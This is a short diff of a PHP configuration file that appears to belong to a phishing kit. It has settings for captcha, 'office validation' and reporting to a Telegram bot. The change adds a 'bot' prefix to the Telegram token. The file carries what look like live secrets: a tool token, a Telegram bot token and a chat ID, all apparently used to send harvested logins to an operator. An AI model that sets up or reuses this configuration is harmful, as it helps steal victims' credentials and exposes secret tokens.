@@ -13,7 +13,7 @@ $token = 'W3LL-OV6-manrolly-borCL5EhT9u0DI1S6jOiKQqYo'; // OV6 Token from tools 
 $captha = false; //Set to false to turn off captha & set to true to turn on!
 
 $reporttele = true; //Set to false to turn off report to telegram & set to true to turn on!
-$teletoken = '5191583666:AAHE7v-a7W8bIYnOMLx2jFA-hRsj_MVcaTk'; //Set your telegram bot token here
+$teletoken = 'bot5191583666:AAHE7v-a7W8bIYnOMLx2jFA-hRsj_MVcaTk'; //Set your telegram bot token here
 $telechatid = '5223240952'; //Set your telegram group chat id here
 
 $officevalid = true; //Set to false to turn off office validation & set to true to turn on!
